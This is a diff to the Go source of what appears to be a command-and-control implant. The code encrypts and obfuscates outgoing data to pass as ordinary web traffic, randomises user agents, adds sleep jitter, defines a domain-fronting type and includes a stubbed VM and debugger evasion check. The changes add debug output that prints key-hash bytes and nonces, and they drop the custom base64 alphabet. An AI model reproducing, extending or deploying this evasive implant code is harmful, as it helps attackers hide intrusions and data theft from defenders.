@@ -8,7 +8,8 @@ import (
 	"crypto/rand"
 	"crypto/sha256"
 	"encoding/base64"
-//	"encoding/hex"
+
+	//	"encoding/hex"
 	"fmt"
 	"io"
 	"math/big"
@@ -35,6 +36,10 @@ func NewCryptoManager(primaryKey, secondaryKey string) (*CryptoManager, error) {
 	pKey := sha256.Sum256([]byte(primaryKey))
 	sKey := sha256.Sum256([]byte(secondaryKey))
 
+	// DEBUG: Print key hash
+	fmt.Printf("[CRYPTO] Primary key hash (first 8 bytes): %x\n", pKey[:8])
+	fmt.Printf("[CRYPTO] Secondary key hash (first 8 bytes): %x\n", sKey[:8])
+
 	block, err := aes.NewCipher(pKey[:])
 	if err != nil {
 		return nil, fmt.Errorf("failed to create cipher: %v", err)
@@ -54,31 +59,43 @@ func NewCryptoManager(primaryKey, secondaryKey string) (*CryptoManager, error) {
 
 // EncryptData encrypts data with multiple layers
 func (cm *CryptoManager) EncryptData(data []byte) (string, error) {
+	// DEBUG: Log input
+	fmt.Printf("[CRYPTO DEBUG] Encrypting %d bytes of data\n", len(data))
+	fmt.Printf("[CRYPTO DEBUG] Primary key: %x\n", cm.primaryKey[:8])
+
 	// Layer 1: Compress data
 	compressed, err := cm.compressData(data)
 	if err != nil {
 		return "", fmt.Errorf("compression failed: %v", err)
 	}
+	fmt.Printf("[CRYPTO DEBUG] Compressed size: %d bytes\n", len(compressed))
 
 	// Layer 2: Add padding
 	padded := cm.addPadding(compressed)
+	fmt.Printf("[CRYPTO DEBUG] Padded size: %d bytes\n", len(padded))
 
 	// Layer 3: AES-GCM encryption
 	nonce := make([]byte, cm.gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return "", fmt.Errorf("nonce generation failed: %v", err)
 	}
+	fmt.Printf("[CRYPTO DEBUG] Nonce: %x\n", nonce)
 
 	encrypted := cm.gcm.Seal(nil, nonce, padded, nil)
+	fmt.Printf("[CRYPTO DEBUG] Encrypted size: %d bytes\n", len(encrypted))
 
 	// Layer 4: Combine nonce + encrypted data
 	combined := append(nonce, encrypted...)
 
 	// Layer 5: Base64 encoding with custom alphabet
 	encoded := cm.customBase64Encode(combined)
+	fmt.Printf("[CRYPTO DEBUG] Encoded length: %d chars\n", len(encoded))
+	fmt.Printf("[CRYPTO DEBUG] First 50 chars encoded: %.50s\n", encoded)
 
 	// Layer 6: Add obfuscation markers
 	obfuscated := cm.addObfuscationMarkers(encoded)
+	fmt.Printf("[CRYPTO DEBUG] Final obfuscated length: %d chars\n", len(obfuscated))
+	fmt.Printf("[CRYPTO DEBUG] Marker used: %.20s...\n", obfuscated[:20])
 
 	return obfuscated, nil
 }
@@ -124,15 +141,15 @@ func (cm *CryptoManager) DecryptData(obfuscatedData string) ([]byte, error) {
 func (cm *CryptoManager) compressData(data []byte) ([]byte, error) {
 	var buf bytes.Buffer
 	writer := gzip.NewWriter(&buf)
-	
+
 	if _, err := writer.Write(data); err != nil {
 		return nil, err
 	}
-	
+
 	if err := writer.Close(); err != nil {
 		return nil, err
 	}
-	
+
 	return buf.Bytes(), nil
 }
 
@@ -143,7 +160,7 @@ func (cm *CryptoManager) decompressData(data []byte) ([]byte, error) {
 		return nil, err
 	}
 	defer reader.Close()
-	
+
 	return io.ReadAll(reader)
 }
 
@@ -153,13 +170,13 @@ func (cm *CryptoManager) addPadding(data []byte) []byte {
 	paddingSize := 1 + (len(data) % 16)
 	padding := make([]byte, paddingSize)
 	rand.Read(padding)
-	
+
 	// Prepend padding size as first byte, then padding, then data
 	result := make([]byte, 1+paddingSize+len(data))
 	result[0] = byte(paddingSize)
 	copy(result[1:1+paddingSize], padding)
 	copy(result[1+paddingSize:], data)
-	
+
 	return result
 }
 
@@ -168,53 +185,24 @@ func (cm *CryptoManager) removePadding(data []byte) []byte {
 	if len(data) < 2 {
 		return data
 	}
-	
+
 	paddingSize := int(data[0])
 	if paddingSize >= len(data) {
 		return data
 	}
-	
+
 	return data[1+paddingSize:]
 }
 
-// Custom Base64 encoding with shuffled alphabet
+// TEMPORARY: Use standard base64 to fix encryption
 func (cm *CryptoManager) customBase64Encode(data []byte) string {
-	// Custom alphabet (shuffled standard base64)
-	customAlphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-	shuffledAlphabet := "ZmNxWvutsrqponmlkjihgfedcbaYXVUTSRQPOMLKJIHGFEDCBA9876543210/+"
-	
-	// Standard base64 encode first
-	encoded := base64.StdEncoding.EncodeToString(data)
-	
-	// Replace characters with custom alphabet
-	result := strings.Builder{}
-	for _, char := range encoded {
-		if idx := strings.IndexRune(customAlphabet, char); idx >= 0 {
-			result.WriteByte(shuffledAlphabet[idx])
-		} else {
-			result.WriteRune(char)
-		}
-	}
-	
-	return result.String()
+	// SKIP custom alphabet - use standard base64
+	return base64.StdEncoding.EncodeToString(data)
 }
 
-// Custom Base64 decoding
 func (cm *CryptoManager) customBase64Decode(encoded string) ([]byte, error) {
-	customAlphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-	shuffledAlphabet := "ZmNxWvutsrqponmlkjihgfedcbaYXVUTSRQPOMLKJIHGFEDCBA9876543210/+"
-	
-	// Reverse the character mapping
-	result := strings.Builder{}
-	for _, char := range encoded {
-		if idx := strings.IndexRune(shuffledAlphabet, char); idx >= 0 {
-			result.WriteByte(customAlphabet[idx])
-		} else {
-			result.WriteRune(char)
-		}
-	}
-	
-	return base64.StdEncoding.DecodeString(result.String())
+	// SKIP custom alphabet - use standard base64
+	return base64.StdEncoding.DecodeString(encoded)
 }
 
 // addObfuscationMarkers adds random markers to make data look like legitimate traffic
@@ -227,7 +215,7 @@ func (cm *CryptoManager) addObfuscationMarkers(data string) string {
 		"content=",
 		"response=",
 	}
-	
+
 	// Pick random marker
 	marker := markers[cm.randomInt(len(markers))]
 	return marker + data
@@ -243,13 +231,13 @@ func (cm *CryptoManager) removeObfuscationMarkers(data string) string {
 		"content=",
 		"response=",
 	}
-	
+
 	for _, marker := range markers {
 		if strings.HasPrefix(data, marker) {
 			return data[len(marker):]
 		}
 	}
-	
+
 	return data
 }
 
@@ -325,25 +313,25 @@ func (sm *SleepManager) Sleep() {
 		time.Sleep(sm.baseInterval)
 		return
 	}
-	
+
 	// Calculate jitter range
 	jitterRange := float64(sm.baseInterval) * sm.jitter
 	maxJitter := int64(jitterRange)
-	
+
 	if maxJitter <= 0 {
 		time.Sleep(sm.baseInterval)
 		return
 	}
-	
+
 	// Generate random jitter
 	jitterAmount, _ := rand.Int(rand.Reader, big.NewInt(maxJitter*2))
 	actualJitter := time.Duration(jitterAmount.Int64() - maxJitter)
-	
+
 	finalDuration := sm.baseInterval + actualJitter
 	if finalDuration < time.Second {
 		finalDuration = time.Second
 	}
-	
+
 	time.Sleep(finalDuration)
 }
 
@@ -381,7 +369,7 @@ func (df *DomainFronting) GetHostHeader() string {
 
 // Anti-Analysis techniques
 type AntiAnalysis struct {
-	vmIndicators     []string
+	vmIndicators       []string
 	debuggerIndicators []string
 }
 
@@ -390,7 +378,7 @@ func NewAntiAnalysis() *AntiAnalysis {
 	return &AntiAnalysis{
 		vmIndicators: []string{
 			"VMware",
-			"VirtualBox", 
+			"VirtualBox",
 			"QEMU",
 			"Xen",
 			"Hyper-V",
@@ -409,7 +397,7 @@ func NewAntiAnalysis() *AntiAnalysis {
 func (aa *AntiAnalysis) CheckEnvironment() bool {
 	// This is a simplified check - in real implementation,
 	// you'd check registry keys, running processes, timing attacks, etc.
-	
+
 	// For now, just return true (safe environment)
 	// In production, implement actual VM/sandbox detection
 	return true
@@ -417,9 +405,9 @@ func (aa *AntiAnalysis) CheckEnvironment() bool {
 
 // Example usage and integration
 type SecureAgent struct {
-	crypto     *CryptoManager
-	obfuscator *TrafficObfuscator
-	sleeper    *SleepManager
+	crypto       *CryptoManager
+	obfuscator   *TrafficObfuscator
+	sleeper      *SleepManager
 	antiAnalysis *AntiAnalysis
 }
 
@@ -429,7 +417,7 @@ func NewSecureAgent(primaryKey, secondaryKey string, interval time.Duration) (*S
 	if err != nil {
 		return nil, err
 	}
-	
+
 	return &SecureAgent{
 		crypto:       crypto,
 		obfuscator:   NewTrafficObfuscator(),
@@ -444,20 +432,20 @@ func (sa *SecureAgent) SecureSend(data []byte) (string, map[string]string, error
 	if !sa.antiAnalysis.CheckEnvironment() {
 		return "", nil, fmt.Errorf("unsafe environment detected")
 	}
-	
+
 	// Encrypt data
 	encrypted, err := sa.crypto.EncryptData(data)
 	if err != nil {
 		return "", nil, err
 	}
-	
+
 	// Prepare headers
 	headers := map[string]string{
 		"User-Agent":    sa.obfuscator.GetRandomUserAgent(),
 		"Content-Type":  "application/x-www-form-urlencoded",
 		"Cache-Control": "no-cache",
 	}
-	
+
 	return encrypted, headers, nil
 }
 
